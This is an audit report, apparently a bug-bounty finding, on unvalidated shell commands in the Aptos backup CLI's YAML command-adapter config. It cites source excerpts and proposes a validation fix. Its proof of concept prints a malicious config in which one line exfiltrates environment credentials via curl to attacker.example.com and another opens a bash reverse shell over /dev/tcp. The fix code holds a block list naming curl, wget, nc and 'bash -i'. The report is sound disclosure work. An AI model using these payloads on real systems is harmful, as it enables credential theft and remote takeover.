# Audit Report

## Title
Command Injection via Unvalidated Shell Commands in Backup CLI Configuration File

## Summary
The backup CLI's `CommandAdapter` executes arbitrary shell commands from YAML configuration files without any validation, sanitization, or restriction. An attacker who can control or influence the config file content can achieve Remote Code Execution on nodes running the backup infrastructure.

## Finding Description

The `CommandAdapter` in the backup CLI system loads shell commands from a YAML configuration file and executes them directly via `bash -c` without any validation. [1](#0-0) 

The config file contains command strings for various backup operations: [2](#0-1) 

These command strings are deserialized from YAML with **zero validation**. A grep search for validation patterns in the command_adapter directory confirms no sanitization logic exists.

When a backup operation is triggered, the command string is prepended with shell options and executed: [3](#0-2) 

The command is then spawned via `bash -c`: [4](#0-3) 

While the system validates *environment variables* passed to commands (via `ShellSafeName`): [5](#0-4) 

The command strings themselves from the config file remain completely unvalidated.

**Attack Path:**
1. Attacker crafts a malicious config file with injected commands
2. Operator obtains this config via supply chain compromise (malicious tutorial, compromised repository, social engineering)
3. Config is deployed to Kubernetes cluster: [6](#0-5) 

4. Backup process executes malicious commands with access to:
   - Backup service API (all blockchain data)
   - Cloud storage credentials (environment variables)
   - Network access to external storage

## Impact Explanation

This qualifies as **Critical Severity** under Aptos Bug Bounty criteria: **Remote Code Execution on validator node** (or backup infrastructure node).

The backup infrastructure has privileged access to:
- Complete blockchain history via backup service API
- Cloud storage credentials (AWS, GCS, Azure) passed as environment variables
- Network connectivity to external storage systems
- Metadata about backup operations

An attacker achieving RCE could:
- Exfiltrate complete blockchain history and private backup metadata
- Steal cloud credentials and access/modify backup data
- Use the compromised node as a pivot point for further attacks
- Manipulate backup data to enable future recovery attacks

## Likelihood Explanation

**Medium-to-High Likelihood** due to:

1. **Supply Chain Attack Vector**: Operators commonly copy sample configurations from documentation, tutorials, or repositories. A compromised source could distribute malicious configs.

2. **No Warning or Validation**: The system provides no defense against malicious configs. The documentation doesn't warn operators about this risk.

3. **Common Deployment Pattern**: The Kubernetes deployment automatically loads configs from ConfigMaps, creating an automated attack path if the ConfigMap source is compromised.

However, this requires either:
- Compromise of trusted configuration sources, OR
- Social engineering of operators to use malicious configs

The attack requires influencing trusted operator actions, which raises the bar but doesn't eliminate the risk entirely (supply chain attacks are increasingly common).

## Recommendation

Implement command validation in the config loading process:

```rust
// In config.rs, add validation when loading commands
impl Commands {
    pub fn validate(&self) -> Result<()> {
        // Define allowed command patterns
        const ALLOWED_COMMANDS: &[&str] = &[
            "echo", "cat", "gzip", "aws", "gsutil", "azcopy", 
            "mkdir", "mv", "ls", "cd", "test", "sed", "exec"
        ];
        
        let all_commands = vec![
            &self.create_backup,
            &self.create_for_write,
            &self.open_for_read,
            &self.save_metadata_line,
            &self.list_metadata_files,
        ];
        
        for cmd in all_commands {
            // Check for suspicious patterns
            if cmd.contains("curl") || cmd.contains("wget") || 
               cmd.contains("nc") || cmd.contains("bash -i") {
                bail!("Command contains suspicious patterns: {}", cmd);
            }
            
            // Validate only allowed executables are used
            // (This is a simplified example - real validation should be more robust)
        }
        
        Ok(())
    }
}

impl CommandAdapterConfig {
    pub async fn load_from_file(path: &Path) -> Result<Self> {
        let path_str = path.to_str().unwrap_or_default();
        let mut file = tokio::fs::File::open(path).await.err_notes(path_str)?;
        let mut content = Vec::new();
        file.read_to_end(&mut content).await.err_notes(path_str)?;

        let config: Self = serde_yaml::from_slice(&content)?;
        config.commands.validate()?;  // ADD VALIDATION HERE
        Ok(config)
    }
}
```

Additionally:
1. Add documentation warning about config file security
2. Implement config signing/verification for production deployments
3. Consider restricting commands to a predefined safe subset
4. Add runtime monitoring for unexpected command patterns

## Proof of Concept

**Malicious Config File (`malicious.yaml`):**
```yaml
env_vars:
  - key: "EXFIL_SERVER"
    value: "attacker.example.com"

commands:
  create_backup: |
    # Exfiltrate environment variables (including cloud credentials)
    env | curl -X POST -d @- http://$EXFIL_SERVER/exfil
    echo "$BACKUP_NAME"
  
  create_for_write: |
    # Execute reverse shell
    bash -i >& /dev/tcp/$EXFIL_SERVER/4444 0>&1 &
    echo "$BACKUP_HANDLE/$FILE_NAME"
    exec 1>&-
    cat > /dev/null
  
  open_for_read: "cat /dev/null"
  save_metadata_line: "echo 'metadata/$FILE_NAME'; exec 1>&-; cat > /dev/null"
  list_metadata_files: "echo ''"
```

**Exploitation Steps:**

1. Attacker publishes malicious config to a compromised tutorial or repository
2. Operator copies config and deploys to Kubernetes cluster
3. When backup runs with command:
```bash
aptos-debugger aptos-db backup continuously \
  --backup-service-address http://localhost:6186 \
  --command-adapter-config /opt/aptos/etc/malicious.yaml
```
4. On first `create_backup` call, environment variables (including cloud credentials) are exfiltrated
5. On first `create_for_write` call, reverse shell is established to attacker's server
6. Attacker now has RCE on backup infrastructure with access to all backup data and credentials

### Citations

**File:** storage/backup/backup-cli/src/storage/command_adapter/config.rs (L41-72)
```rust
#[derive(Clone, Default, Deserialize)]
pub struct Commands {
    /// Command line to create backup.
    /// input env vars:
    ///     $BACKUP_NAME
    /// expected output on stdout:
    ///     BackupHandle, trailing newline is trimmed
    pub create_backup: String,
    /// Command line to open a file for writing.
    /// input env vars:
    ///     $BACKUP_HANDLE returned from the previous command
    ///     $FILE_NAME
    /// stdin will be fed with byte stream.
    /// expected output on stdout:
    ///     FileHandle, trailing newline
    pub create_for_write: String,
    /// Command line to open a file for reading.
    /// input env vars:
    ///     $FILE_NAME
    /// expected stdout to stream out bytes of the file.
    pub open_for_read: String,
    /// Command line to save a line of metadata
    /// input env vars:
    ///     $FILE_NAME
    /// stdin will be fed with a line of text with a trailing newline.
    pub save_metadata_line: String,
    /// Command line to list all existing metadata file handles.
    /// expected stdout to stream out lines of file handles.
    pub list_metadata_files: String,
    /// Command line to backup one metadata file to a metadata backup folder
    pub backup_metadata_file: Option<String>,
}
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/config.rs (L82-90)
```rust
impl CommandAdapterConfig {
    pub async fn load_from_file(path: &Path) -> Result<Self> {
        let path_str = path.to_str().unwrap_or_default();
        let mut file = tokio::fs::File::open(path).await.err_notes(path_str)?;
        let mut content = Vec::new();
        file.read_to_end(&mut content).await.err_notes(path_str)?;

        Ok(serde_yaml::from_slice(&content)?)
    }
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/command.rs (L31-36)
```rust
    pub fn new(raw_cmd: &str, param_env_vars: Vec<EnvVar>, config_env_vars: Vec<EnvVar>) -> Self {
        Self {
            cmd_str: format!("set -o nounset -o errexit -o pipefail; {}", raw_cmd),
            param_env_vars,
            config_env_vars,
        }
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/command.rs (L65-80)
```rust
    pub fn spawn(command: Command) -> Result<Self> {
        debug!("Spawning {:?}", command);

        let mut cmd = tokio::process::Command::new("bash");
        cmd.args(["-c", &command.cmd_str]);
        cmd.stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::inherit());
        for v in command
            .config_env_vars
            .iter()
            .chain(command.param_env_vars.iter())
        {
            cmd.env(&v.key, &v.value);
        }
        let child = cmd.spawn().err_notes(&cmd)?;
```

**File:** storage/backup/backup-cli/src/storage/mod.rs (L51-58)
```rust
impl ShellSafeName {
    const PATTERN: &'static str = r"\A[a-zA-Z0-9][a-zA-Z0-9._-]{2,126}\z";

    fn sanitize(name: &str) -> Result<()> {
        static RE: Lazy<Regex> = Lazy::new(|| Regex::new(ShellSafeName::PATTERN).unwrap());
        ensure!(RE.is_match(name), "Illegal name: {}", name,);
        Ok(())
    }
```

**File:** terraform/helm/fullnode/templates/backup.yaml (L69-70)
```yaml
        - "--command-adapter-config"
        - "/opt/aptos/etc/{{ .config.location }}.yaml"
```
